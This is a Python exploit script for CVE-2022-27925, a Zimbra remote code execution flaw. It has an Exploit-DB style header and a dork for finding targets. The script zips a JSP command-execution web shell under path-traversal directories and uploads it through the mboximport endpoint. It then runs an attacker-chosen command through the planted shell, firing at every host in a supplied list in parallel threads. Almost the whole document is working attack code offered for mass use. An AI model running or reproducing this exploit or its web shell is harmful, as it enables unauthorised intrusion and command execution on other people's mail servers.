# Exploit Title: Zimbra RCE 2022
# Dork: title: "<title>Zimbra Web Client Sign In</title>"
# Date: 10/01/2022
# Exploit Author: Inplex-sys
# Vendor Homepage: https://www.zimbra.com/
# Software Link: https://www.zimbra.com/downloads/
# Version: between 8.8.15 and 9.0.0
# Tested on: Debian, Ubuntu, Windows
# CVE : CVE-2022-27925

import sys
import zipfile
import io
import random
import colored
from datetime import datetime
from colored import stylize
import threading
import string
import requests
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class Main:
    def formatConsoleDate( date ):
        return '[' + date.strftime('%Y-%m-%d-%H:%M:%S') + ']'
        pass

    def randomString( size ):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))
        pass

    def normalizeUrl( url ):
        if not "://" in url:
            url = "https://" + url
            url = url.rstrip("/")
        return url
        pass

    def assembleArchive( payload, directory ):
        zipReader = io.BytesIO()
        zipObject = zipfile.ZipFile( zipReader, "w" )
        zipObject.writestr( directory, payload )
        zipObject.close()
        return zipReader.getvalue()
        pass

class Exploit:
    def __init__( self, host ):
        self.javaPayload = r'<%@ page import="java.util.*,java.io.*"%><%%><HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUTTYPE="submit" VALUE="Send"></FORM><pre><%if (request.getParameter("cmd") != null) {    out.println("Command: " + request.getParameter("cmd") + "<div>");    Process p;    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));    }    else{        p = Runtime.getRuntime().exec(request.getParameter("cmd"));    }    OutputStream os = p.getOutputStream();    InputStream in = p.getInputStream();    DataInputStream dis = new DataInputStream(in);    String disr = dis.readLine();    while ( disr != null ) {    out.println(disr);    disr = dis.readLine();    }}%><div></pre></BODY></HTML>'
        self.fileName = Main.randomString(6) + ".jsp"
        self.host = host
        self.vulnerableDirectories = [
            "../../../../mailboxd/webapps/zimbraAdmin/",
            "../../../../jetty_base/webapps/zimbraAdmin/",
            "../../../../jetty/webapps/zimbraAdmin/"
        ]
        self.headers = {
            "content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
        }
        pass


    def run( self ):
        global params

        runAttempts = 0
        for directory in self.vulnerableDirectories:
            runAttempts += 1
            
            try:
                zippedfile = Main.assembleArchive(self.javaPayload, directory + self.fileName)

                requests.post(self.host + "",data=zippedfile,headers=self.headers,verify=False,timeout=20)
                requests.post(self.host + "/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1",data=zippedfile,headers=self.headers,verify=False,timeout=20)

                httpRequest = requests.get(self.host + "/zimbraAdmin/" + self.fileName + "?cmd=" + params['command'],verify=False,timeout=20)
                if httpRequest.status_code == 200:
                    print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                        stylize(f" [success] Command executed on {self.host} [{runAttempts}/3]", colored.fg('green')))
                    return True
                else:
                    #print(stylize(Main.formatConsoleDate(datetime.today()), colored.fg('#ffe900')) +
                    #    stylize(f" [error] {self.host} is not vulnerable [{runAttempts}/3]", colored.fg('red')))
                    pass
            except:
                pass
            pass
        pass


def main():
    global params

    print(stylize('''
                 ╦ ╦╔═╗╦═╗╔═╗╔╗ 
                 ╠═╣║ ╦╠╦╝╠═╣╠╩╗
                 ╩ ╩╚═╝╩╚═╩ ╩╚═╝
            test first, analyze after
    ''', colored.fg('red')))

    if len(sys.argv) < 3:
        print(stylize("""
    [ERROR]""", colored.fg('red'),
                      colored.attr('underlined'))
              + """ bad command usage
            """ + stylize("Usage Sheme:", colored.fg('#ffe900'),
                          colored.attr('underlined')) + """
                - user@some_name:~# python3 main.py <vuln-list> <command>
        """)
        sys.exit()
        pass

    params = {}
    params['file'] = sys.argv[1]
    params['command'] = sys.argv[2]

    with open(params['file'], 'r') as file:
        for line in file:
            host = line.strip()
            exploit = Exploit(host)
            threading.Thread(target=exploit.run).start()
            pass
        pass
    pass


if __name__ == "__main__":
    main()
    pass
